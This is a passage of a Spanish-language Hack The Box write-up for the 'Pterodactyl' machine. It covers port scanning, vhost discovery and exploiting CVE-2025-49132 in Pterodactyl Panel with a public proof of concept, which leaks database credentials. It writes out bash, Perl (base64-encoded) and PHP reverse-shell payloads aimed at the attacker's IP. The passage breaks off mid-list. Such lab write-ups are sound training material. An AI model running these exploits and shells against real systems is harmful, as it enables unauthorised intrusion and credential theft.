+  <path d="M20 7.5L12 12" stroke="currentColor" stroke-width="2.6" stroke-linecap="round"/>
+</svg>
+</span></span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+  
+
+  
+
+  
+    <div class="mb-5"></div>
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-10">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Tabla de contenido
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#nmap-scan">Nmap Scan</a></li>
+    <li><a href="#puerto-80-http">Puerto 80, HTTP</a>
+      <ul>
+        <li><a href="#dominio-principal-pterodactylhtb">Dominio principal <code>pterodactyl.htb</code></a></li>
+        <li><a href="#subdominio-panelpterodactylhtb">Subdominio <code>panel.pterodactyl.htb</code></a></li>
+        <li><a href="#cve-2025-49132-revshell">CVE-2025-49132, Revshell</a></li>
+        <li><a href="#plan-b-webshell">Plan B, Webshell</a></li>
+      </ul>
+    </li>
+    <li><a href="#privesc-desde-wwwrun">Privesc (desde <code>wwwrun</code>)</a></li>
+    <li><a href="#privesc-desde-phileasfogg3">Privesc (desde <code>phileasfogg3</code>)</a>
+      <ul>
+        <li><a href="#redis-rabbit-hole">Redis (rabbit hole)</a></li>
+        <li><a href="#sudo-rabbit-hole">Sudo (rabbit hole)</a></li>
+        <li><a href="#analizando-programas-instalados-con-trivy">Analizando programas instalados con Trivy</a></li>
+        <li><a href="#cve-2025-6019">CVE-2025-6019</a></li>
+      </ul>
+    </li>
+    <li><a href="#post-root-cve-d-bus-y-polkit">Post-Root: CVE, D-Bus y Polkit.</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Tabla de contenido
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#nmap-scan">Nmap Scan</a></li>
+    <li><a href="#puerto-80-http">Puerto 80, HTTP</a>
+      <ul>
+        <li><a href="#dominio-principal-pterodactylhtb">Dominio principal <code>pterodactyl.htb</code></a></li>
+        <li><a href="#subdominio-panelpterodactylhtb">Subdominio <code>panel.pterodactyl.htb</code></a></li>
+        <li><a href="#cve-2025-49132-revshell">CVE-2025-49132, Revshell</a></li>
+        <li><a href="#plan-b-webshell">Plan B, Webshell</a></li>
+      </ul>
+    </li>
+    <li><a href="#privesc-desde-wwwrun">Privesc (desde <code>wwwrun</code>)</a></li>
+    <li><a href="#privesc-desde-phileasfogg3">Privesc (desde <code>phileasfogg3</code>)</a>
+      <ul>
+        <li><a href="#redis-rabbit-hole">Redis (rabbit hole)</a></li>
+        <li><a href="#sudo-rabbit-hole">Sudo (rabbit hole)</a></li>
+        <li><a href="#analizando-programas-instalados-con-trivy">Analizando programas instalados con Trivy</a></li>
+        <li><a href="#cve-2025-6019">CVE-2025-6019</a></li>
+      </ul>
+    </li>
+    <li><a href="#post-root-cve-d-bus-y-polkit">Post-Root: CVE, D-Bus y Polkit.</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          <ul>
+<li>Dificultad: <code>medium</code></li>
+<li>Tiempo aprox. <code>~6h</code></li>
+<li><strong>Datos Iniciales</strong>: <code>10.129.4.98</code></li>
+</ul>
+
+<h2 class="relative group">Nmap Scan
+    <div id="nmap-scan" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#nmap-scan" aria-label="Ancla">#</a>
+    </span>
+    
+</h2>
+<p>Empezamos haciendo un escaneo de todos los puertos en TCP:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nmap -sT -Pn -n -p- --open 10.129.4.98 -v                
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-02-24 17:47 -0500
+</span></span><span style="display:flex;"><span>Initiating Connect Scan at 17:47
+</span></span><span style="display:flex;"><span>Scanning 10.129.4.98 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.129.4.98
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.129.4.98
+</span></span><span style="display:flex;"><span>RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+</span></span><span style="display:flex;"><span>RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+</span></span><span style="display:flex;"><span>RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+</span></span><span style="display:flex;"><span>RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+</span></span><span style="display:flex;"><span>...</span></span></code></pre></div></div>
+<p>Como al parecer tarda mucho, limitamos la cantidad de puertos a la predeterminada de nmap (Top 1000 puertos) y escaneamos servicios después:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nmap -sT -Pn -n --open 10.129.4.98
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ nmap -sT -Pn -n -p22,80 -sVC --open 10.129.4.98
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 9.6 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.21.5
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.21.5
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://pterodactyl.htb/</span></span></code></pre></div></div>
+<p>Añadimos <code>pterodactyl.htb</code> a <code>/etc/hosts</code>.</p>
+<p>Vemos los siguientes puertos abiertos:</p>
+<ul>
+<li><strong>22/TCP (SSH)</strong>: Versión vulnerable a algunos ataques MitM y a <a href="https://www.incibe.es/incibe-cert/alerta-temprana/avisos/regresshion-vulnerabilidad-rce-en-servidor-openssh"  target="_blank" rel="noreferrer">RegreSSHion</a>, difícilmente explotable.</li>
+<li><strong>80/TCP (HTTP)</strong>: Vulnerable a DoS y a otros ataques no relevantes. </li>
+</ul>
+<p>No hay gran cosa, tendremos que ir a por el puerto 80.</p>
+
+<h2 class="relative group">Puerto 80, HTTP
+    <div id="puerto-80-http" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#puerto-80-http" aria-label="Ancla">#</a>
+    </span>
+    
+</h2>
+<p>Antes de entrar a la página principal, dado que nmap nos ha indicado que se utilizan vhosts (al indicar el <code>did not follow redirect to http://pterodactyl.htb</code>), es posible que haya más en la máquina, así que primero buscamos vhosts:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gobuster vhost --url http://pterodactyl.htb --wordlist /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt --append-domain
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.8.2
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                       http://pterodactyl.htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                    GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Append Domain:             true
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in VHOST enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>panel.pterodactyl.htb Status: <span style="color:#ae81ff">200</span> <span style="color:#f92672">[</span>Size: 1897<span style="color:#f92672">]</span></span></span></code></pre></div></div>
+<p>Y encontramos <code>panel.pterodactyl.htb</code>, lo añadimos a <code>/etc/hosts</code>.</p>
+
+<h3 class="relative group">Dominio principal <code>pterodactyl.htb</code>
+    <div id="dominio-principal-pterodactylhtb" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#dominio-principal-pterodactylhtb" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<p>Al entrar, encontramos una invitación para unirnos a un servidor de Minecraft <code>MonitorLand</code>.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt=""
+    width="1247"
+    height="683"
+    src="/writeups/pterodactyl/monitorland_hu_c72c2b52aaa6d310.png"
+    srcset="/writeups/pterodactyl/monitorland_hu_c72c2b52aaa6d310.png 800w, /writeups/pterodactyl/monitorland.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeups/pterodactyl/monitorland.png"></figure>
+</p>
+<p>Aquí vemos dos cosas:</p>
+<ul>
+<li>Un subdominio <code>play.pterodactyl.htb</code> (que redirige exactamente a la misma página)</li>
+<li>Unos changelogs en <code>http://pterodactyl.htb/changelog.txt</code>:</li>
+</ul>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-changelog.txt" data-lang="changelog.txt"><span style="display:flex;"><span>MonitorLand - CHANGELOG.txt
+</span></span><span style="display:flex;"><span>======================================
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Version 1.20.X
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Added] Main Website Deployment
+</span></span><span style="display:flex;"><span>--------------------------------
+</span></span><span style="display:flex;"><span>- Deployed the primary landing site for MonitorLand.
+</span></span><span style="display:flex;"><span>- Implemented homepage, and link for Minecraft server.
+</span></span><span style="display:flex;"><span>- Integrated site styling and dark-mode as primary.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Linked] Subdomain Configuration
+</span></span><span style="display:flex;"><span>--------------------------------
+</span></span><span style="display:flex;"><span>- Added DNS and reverse proxy routing for play.pterodactyl.htb.
+</span></span><span style="display:flex;"><span>- Configured NGINX virtual host for subdomain forwarding.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Installed] Pterodactyl Panel v1.11.10
+</span></span><span style="display:flex;"><span>--------------------------------------
+</span></span><span style="display:flex;"><span>- Installed Pterodactyl Panel.
+</span></span><span style="display:flex;"><span>- Configured environment:
+</span></span><span style="display:flex;"><span>  - PHP with required extensions.
+</span></span><span style="display:flex;"><span>  - MariaDB 11.8.3 backend.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Enhanced] PHP Capabilities
+</span></span><span style="display:flex;"><span>-------------------------------------
+</span></span><span style="display:flex;"><span>- Enabled PHP-FPM for smoother website handling on all domains.
+</span></span><span style="display:flex;"><span>- Enabled PHP-PEAR for PHP package management.
+</span></span><span style="display:flex;"><span>- Added temporary PHP debugging via phpinfo()</span></span></code></pre></div></div>
+<p>De aquí ya podemos apuntar que se está usando <code>Pterodactyl Panel v1.11.10</code>, aunque todavía no sabemos exactamente qué es. Además se usa <code>MariaDB 11.8.3</code> como backend.</p>
+
+<h3 class="relative group">Subdominio <code>panel.pterodactyl.htb</code>
+    <div id="subdominio-panelpterodactylhtb" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#subdominio-panelpterodactylhtb" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<p>Al entrar, nos encontramos un panel de login </p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt=""
+    width="1027"
+    height="542"
+    src="/writeups/pterodactyl/pterodactyl_login_hu_12eb63034645b01b.png"
+    srcset="/writeups/pterodactyl/pterodactyl_login_hu_12eb63034645b01b.png 800w, /writeups/pterodactyl/pterodactyl_login.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeups/pterodactyl/pterodactyl_login.png"></figure>
+</p>
+<p>No tenemos credenciales, pero, de todas formas, primero convendría saber qué es Pterodactyl para poder ver cómo enfrentarnos a él. Al mirar en Internet encontramos <a href="https://coolify.io/docs/services/pterodactyl"  target="_blank" rel="noreferrer">varias páginas</a> que nos indican de qué se trata:</p>
+<blockquote><p><em>Pterodactyl is a free, open-source game server management panel built with PHP, React, and Go. Designed with security in mind, Pterodactyl runs all game servers in isolated Docker containers while exposing a beautiful and intuitive UI to end users.</em></p>
+</blockquote><blockquote><p><em>Pterodactyl consists of two core components that work together: the Panel (web interface) and Wings (server daemon). The Panel provides the management interface, while Wings handles the actual game server operations on each node.</em></p>
+</blockquote>
+<h3 class="relative group">CVE-2025-49132, Revshell
+    <div id="cve-2025-49132-revshell" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#cve-2025-49132-revshell" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<p>Al mirar en Internet, vemos que existe una vulnerabilidad crítica (<code>10.0 CRITICAL</code> en Github) de Unauthenticated RCE: <a href="https://nvd.nist.gov/vuln/detail/cve-2025-49132"  target="_blank" rel="noreferrer"><code>CVE-2025-49132</code></a>. Afecta a las versiones anteriores a la <code>v1.11.11</code>, entre las que se encuentra la que hemos visto que corre en este servidor: <code>v1.11.10</code>.</p>
+<p>Usaremos un <a href="https://github.com/rippxsec/CVE-2025-49132"  target="_blank" rel="noreferrer">exploit público</a>:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 poc.py -H panel.pterodactyl.htb --scan 
+</span></span><span style="display:flex;"><span>╔══════════════════════════════════════╗
+</span></span><span style="display:flex;"><span>║   CVE-2025-49132 - Pterodactyl RCE   ║
+</span></span><span style="display:flex;"><span>╚══════════════════════════════════════╝
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Scanning: http://panel.pterodactyl.htb/locales/locale.json
+</span></span><span style="display:flex;"><span>-------------------------------------------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VULNERABLE - Database credentials leaked
+</span></span><span style="display:flex;"><span>    Host:     127.0.0.1
+</span></span><span style="display:flex;"><span>    Port:     <span style="color:#ae81ff">3306</span>
+</span></span><span style="display:flex;"><span>    Database: panel
+</span></span><span style="display:flex;"><span>    Username: pterodactyl
+</span></span><span style="display:flex;"><span>    Password: PteraPanel
+</span></span><span style="display:flex;"><span>    Connection: pterodactyl:PteraPanel@127.0.0.1:3306/panel
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VULNERABLE - App configuration leaked
+</span></span><span style="display:flex;"><span>    App Key: base64<span style="color:#f92672">{{</span>UaThTPQnUjrrK61o<span style="color:#f92672">}}</span>+Luk7P9o4hM+gl4UiMJqcbTSThY<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> SECURITY WARNING: APP_KEY exposed!
+</span></span><span style="display:flex;"><span>    App Name: Pterodactyl
+</span></span><span style="display:flex;"><span>    URL:      http://panel.pterodactyl.htb
+</span></span><span style="display:flex;"><span>-------------------------------------------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Target is VULNERABLE to CVE-2025-49132</span></span></code></pre></div></div>
+<p>Apuntamos las credenciales de MariaDB <code>pterodactyl:PteraPanel</code>. Ahora creamos un payload para el revshell:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat payload    
+</span></span><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.15.95/4444 0&gt;&amp;1&#39;</span>
+</span></span><span style="display:flex;"><span>$ cat payload | base64
+</span></span><span style="display:flex;"><span>YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS45NS80NDQ0IDA+JjEnCg<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Este será el payload:</span>
+</span></span><span style="display:flex;"><span>echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS45NS80NDQ0IDA+JjEnCg<span style="color:#f92672">==</span> | base64 -d | bash 2&gt;/dev/null</span></span></code></pre></div></div>
+<p>Lo ejecutamos:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 poc.py -H panel.pterodactyl.htb -c <span style="color:#e6db74">&#39;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS45NS80NDQ0IDA+JjEnCg== | base64 -d | bash 2&gt;/dev/null&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>CVE-2025-49132<span style="color:#f92672">]</span> Pterodactyl Panel RCE via PHP PEAR
+</span></span><span style="display:flex;"><span>- <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Command Output:
+</span></span><span style="display:flex;"><span>wwwrun</span></span></code></pre></div></div>
+<p>Pero en el listener no recibimos nada, solo vemos el output del comando ejecutado inmediatamente antes. Se está usando bash para el reverse shell, que casi seguro existe en el sistema, pero no está de más comprobar:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 poc.py -H panel.pterodactyl.htb -c <span style="color:#e6db74">&#39;whoami &amp;&amp; echo $SHELL &amp;&amp; echo $PATH&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\ </span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Command Output:
+</span></span><span style="display:flex;"><span>wwwrun
+</span></span><span style="display:flex;"><span>/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>/usr/local/bin:/usr/bin:/bin:.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ python3 poc.py -H panel.pterodactyl.htb -c <span style="color:#e6db74">&#39;ls -al /bin/bash&#39;</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Command Output:
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">13</span> Aug <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2024</span> /bin/bash -&gt; /usr/bin/bash
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Y en /usr/bin/bash:</span>
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1012656</span> Aug <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2024</span> /usr/bin/bash</span></span></code></pre></div></div>
+<p>Pero si probamos con cualquiera de las rutas absolutas, seguimos sin recibir nada. Probamos a ver si al menos podemos usar bash:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 poc.py -H panel.pterodactyl.htb -c <span style="color:#e6db74">&#39;echo ls | bash&#39;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\ </span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Command Output:
+</span></span><span style="display:flex;"><span>assets
+</span></span><span style="display:flex;"><span>favicons
+</span></span><span style="display:flex;"><span>index.php
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#... Funciona</span></span></span></code></pre></div></div>
+<p>Comprobamos, al mandar <code>command -v perl</code>, que también existe perl , así que probamos a usar un <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"  target="_blank" rel="noreferrer">revshell</a> de perl:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 poc.py -H panel.pterodactyl.htb -c <span style="color:#e6db74">&#39;echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTUuOTUiOyRwPTQ0NDQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jwo= | base64 -d | bash&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>CVE-2025-49132<span style="color:#f92672">]</span> Pterodactyl Panel RCE via PHP PEAR
+</span></span><span style="display:flex;"><span>| <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Command Output:
+</span></span><span style="display:flex;"><span>/usr/bin/perl</span></span></code></pre></div></div>
+<p>Y sigue sin funcionar.</p>
+
+<h4 class="relative group">Debugging
+    <div id="debugging" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#debugging" aria-label="Ancla">#</a>
+    </span>
+    
+</h4>
+<div class="admonition relative overflow-hidden rounded-lg border-l-4 my-3 px-4 py-3 shadow-sm" data-type="warning">
+      <div class="flex items-center gap-2 font-semibold text-inherit">
+        <div class="flex shrink-0 h-5 w-5 items-center justify-center text-lg"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
+</span></div>
+        <div class="grow">
+          Aviso: Mucho tiempo y texto que no llevan a nada
+        </div>
+      </div><div class="admonition-content mt-3 text-base leading-relaxed text-inherit"><p>Si valoras tu tiempo, aviso de que todo lo que hago a partir de aquí hasta justo antes de <strong><code>Plan B, Webshell</code></strong> lleva hasta un reverse shell que no funciona. Si simplemente quieres saber cómo llegar a rootear la máquina, puedes saltar esta parte. Si te interesa cómo intento debuggearlo, eres libre de quedarte._</p></div></div><p>Tras probar con puertos comunes (80,443) para la reverse shell, sigue sin ir. Comprobamos si hay conectividad alguna o si hay algún firewall bloqueando conexiones:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 poc.py -H panel.pterodactyl.htb -c <span style="color:#e6db74">&#39;curl 10.10.15.95:443&#39;</span>
+</span></span><span style="display:flex;"><span>- <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Command Output:
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE HTML&gt;
+</span></span><span style="display:flex;"><span>&lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...</span></span></code></pre></div></div>
+<p>Y en nuestro server http:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">443</span> <span style="color:#f92672">(</span>http://0.0.0.0:443/<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span>10.129.4.98 - - <span style="color:#f92672">[</span>24/Feb/2026 19:18:13<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -</span></span></code></pre></div></div>
+<p>Tenemos conexión saliente del servidor, pero por algún motivo bash no puede iniciar la conexión. Tras buscar un rato, veo que puede ser que bash esté compilado en el container de Pterodactyl sin soporte para <code>/dev/tcp</code> (una práctica común) con el fin de reducir superficie de ataque. Como sabemos que PHP está instalado y funciona (el propio CVE se basa en PHP), iniciaremos la conexión con PHP y desde ahí iniciaremos bash (Similar a un staged payload).</p>
+<ol>
+<li>Guardamos un archivo <code>revshell.sh</code> con el reverse shell de PHP:</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;10.10.15.95&#34;, 443); exec(&#34;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span></span></span></code></pre></div></div>
+<ol start="2">
